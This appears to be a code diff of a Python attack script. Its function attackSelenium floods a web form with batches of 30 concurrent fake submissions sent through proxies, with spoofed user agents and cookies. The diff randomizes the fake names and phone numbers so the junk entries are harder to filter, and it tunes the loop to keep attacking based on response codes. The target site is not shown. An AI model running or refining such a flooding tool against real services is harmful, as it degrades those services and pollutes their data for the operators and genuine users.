@@ -342,10 +342,10 @@ def sendRequest(url, proxies, userAgent, cookies):
 	data = {
     "country": "NL",
     "submission_type": "standard",
-    "firstname": "asd",
-    "lastname": "asd",
+    "firstname": ''.join(random.choice(letters) for i in range(random.randint(3,6))),
+    "lastname": ''.join(random.choice(letters) for i in range(random.randint(3,6))),
     "email": ''.join(random.choice(letters) for i in range(10)) + "@gmail.com",
-    "telephone": "11111" + str(random.randint(1111,9999))
+    "telephone": str(random.randint(111111111,999999999))
 	}
 
 	cookiesDict = {}
@@ -356,12 +356,15 @@ def sendRequest(url, proxies, userAgent, cookies):
 	for x in range(30):
 		requestsArr.append(grequests.post(url, json=data, headers=headers, proxies=proxies, cookies=cookiesDict))
 	res = grequests.map(requestsArr, exception_handler=my_handler)
-	isClear = False
+	print(res)
 	for r in res:
 		if str(r.status_code) in ['200']:					
-			isClear = True
-	print(res)
-	return isClear
+			return 200
+		if str(r.status_code)[0] in ['5']:	
+			return 500
+		if str(r.status_code)[0] in ['4']:	
+			return 400
+	return 0
 
 def attackSelenium(baseUrl):
 
@@ -432,7 +435,9 @@ def attackSelenium(baseUrl):
 				while True:
 					try:
 						res = sendRequest(driver.current_url, proxies, userAgent, driver.get_cookies())
-						if res == False:
+						if res == 500 and random.randint(1,3) == 1:
+							break
+						if res == 400:
 							break
 						# input = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.NAME, 'firstname')))
 
